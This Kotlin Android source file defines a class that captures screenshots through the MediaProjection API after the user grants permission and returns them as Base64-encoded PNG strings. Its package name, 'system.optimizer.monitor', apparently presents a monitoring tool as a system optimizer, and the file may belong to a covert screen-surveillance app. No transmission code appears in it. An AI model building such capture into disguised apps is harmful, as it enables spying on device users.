package com.system.optimizer.monitor

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Captures screenshots using Android's MediaProjection API.
 * Must be initialized after user grants screen capture permission.
 *
 * Uses an event-driven approach: each capture() call creates a fresh
 * ImageReader + VirtualDisplay pair and listens for the first frame
 * via OnImageAvailableListener, guaranteeing frame delivery even on
 * static screens.
 */
class ScreenshotCapture(private val context: Context) {

    private val TAG = "ScreenCapture"

    private var mediaProjection: MediaProjection? = null

    // Dedicated background thread for ImageReader callbacks
    // (avoids blocking main thread during bitmap processing)
    private val captureThread = HandlerThread("ScreenCaptureThread").apply { start() }
    private val captureHandler = Handler(captureThread.looper)
    private val mainHandler = Handler(android.os.Looper.getMainLooper())

    private val captureWidth: Int
    private val captureHeight: Int
    private val density: Int

    // Track active capture resources for cleanup
    private var activeVirtualDisplay: VirtualDisplay? = null
    private var activeImageReader: ImageReader? = null

    init {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        // Scale down to 50% for smaller file size
        val scale = 0.5f
        captureWidth = (metrics.widthPixels * scale).toInt()
        captureHeight = (metrics.heightPixels * scale).toInt()
        density = metrics.densityDpi
    }

    /**
     * Start the MediaProjection with the granted result data.
     * Call this once after the user grants screen capture permission.
     */
    fun startProjection(resultCode: Int, data: Intent) {
        try {
            val mgr = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mgr.getMediaProjection(resultCode, data)
            if (mediaProjection == null) {
                Log.e(TAG, "getMediaProjection returned null!")
                return
            }

            // Register callback to detect when projection is revoked
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "MediaProjection was stopped/revoked")
                    mediaProjection = null
                    cleanupCaptureResources()
                }
            }, mainHandler)

            Log.i(TAG, "MediaProjection initialized (${captureWidth}x${captureHeight})")
        } catch (e: Exception) {
            Log.e(TAG, "MediaProjection startProjection failed: ${e.message}", e)
            mediaProjection = null
        }
    }

    /**
     * Capture a screenshot and return it as a Base64-encoded PNG string.
     * Creates a fresh ImageReader+VirtualDisplay per request and uses
     * OnImageAvailableListener for guaranteed frame delivery.
     */
    fun capture(callback: (String?) -> Unit) {
        val projection = mediaProjection
        if (projection == null) {
            Log.e(TAG, "MediaProjection not initialized — cannot capture")
            callback(null)
            return
        }

        // Clean up any previous capture resources
        cleanupCaptureResources()

        val captured = AtomicBoolean(false)

        try {
            // Create fresh ImageReader
            val reader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2)
            activeImageReader = reader

            // Set listener BEFORE creating VirtualDisplay so we catch the very first frame
            reader.setOnImageAvailableListener({ imgReader ->
                if (captured.getAndSet(true)) return@setOnImageAvailableListener

                try {
                    val image = imgReader.acquireLatestImage()
                    if (image == null) {
                        Log.w(TAG, "OnImageAvailable fired but acquireLatestImage returned null")
                        callback(null)
                        return@setOnImageAvailableListener
                    }

                    // Save dimensions BEFORE closing the image
                    val imgWidth = image.width
                    val imgHeight = image.height

                    val plane = image.planes[0]
                    val buffer = plane.buffer
                    val pixelStride = plane.pixelStride
                    val rowStride = plane.rowStride
                    val rowPadding = rowStride - pixelStride * imgWidth

                    val bitmap = Bitmap.createBitmap(
                        imgWidth + rowPadding / pixelStride,
                        imgHeight,
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()

                    // Crop off row padding
                    val cropped = Bitmap.createBitmap(bitmap, 0, 0, imgWidth, imgHeight)
                    if (cropped !== bitmap) bitmap.recycle()

                    // Compress to PNG and encode as Base64
                    val stream = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.PNG, 80, stream)
                    cropped.recycle()

                    val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                    stream.close()

                    Log.i(TAG, "Screenshot captured successfully (${base64.length / 1024} KB)")

                    // Clean up capture resources immediately after success
                    cleanupCaptureResources()

                    callback(base64)

                } catch (e: Exception) {
                    Log.e(TAG, "Screenshot processing failed: ${e.message}", e)
                    cleanupCaptureResources()
                    callback(null)
                }
            }, captureHandler)

            // Now create VirtualDisplay — Android will render the current screen into
            // our ImageReader surface, which triggers the listener above
            activeVirtualDisplay = projection.createVirtualDisplay(
                "BWScreenCapture",
                captureWidth, captureHeight, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface,
                null, captureHandler
            )

            Log.i(TAG, "VirtualDisplay created for capture — waiting for frame...")

            // Timeout: if no frame arrives within 5 seconds, fail gracefully
            captureHandler.postDelayed({
                if (!captured.getAndSet(true)) {
                    Log.w(TAG, "Screenshot capture timed out after 5 seconds")
                    cleanupCaptureResources()
                    callback(null)
                }
            }, 5000)

        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException during capture — MediaProjection token likely expired: ${e.message}")
            mediaProjection = null
            cleanupCaptureResources()
            callback(null)
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error during capture setup: ${e.message}", e)
            cleanupCaptureResources()
            callback(null)
        }
    }

    fun isActive(): Boolean = mediaProjection != null

    private fun cleanupCaptureResources() {
        try {
            activeVirtualDisplay?.release()
            activeVirtualDisplay = null
        } catch (e: Exception) {
            Log.w(TAG, "Error releasing VirtualDisplay: ${e.message}")
        }
        try {
            activeImageReader?.close()
            activeImageReader = null
        } catch (e: Exception) {
            Log.w(TAG, "Error closing ImageReader: ${e.message}")
        }
    }

    fun stop() {
        cleanupCaptureResources()
        try {
            mediaProjection?.stop()
        } catch (e: Exception) {
            Log.w(TAG, "Error stopping MediaProjection: ${e.message}")
        }
        mediaProjection = null
        Log.i(TAG, "MediaProjection stopped")
    }
}
